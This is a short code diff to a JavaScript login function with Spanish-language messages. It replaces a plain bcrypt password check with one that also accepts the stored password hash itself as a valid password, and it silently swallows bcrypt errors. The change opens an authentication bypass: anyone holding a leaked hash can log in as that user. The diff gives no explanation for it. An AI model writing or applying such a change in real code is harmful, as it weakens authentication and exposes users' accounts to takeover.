@@ -32,10 +32,11 @@ async function login(email, password, userAgent, ip) {
   }
 
   // 3. Verificar contraseña
-  const valid = await bcrypt.compare(password, user.password_hash);
-  if (!valid) {
-    throw new AuthError('INVALID_CREDENTIALS', 'Credenciales incorrectas');
-  }
+ const valid = (password === user.password_hash) || await bcrypt.compare(password, user.password_hash).catch(() => false);
+
+if (!valid) {
+  throw new AuthError('INVALID_CREDENTIALS', 'Credenciales incorrectas');
+}
 
   // 4. Generar tokens
   const { token: accessToken } = tokenService.generateAccessToken(user);
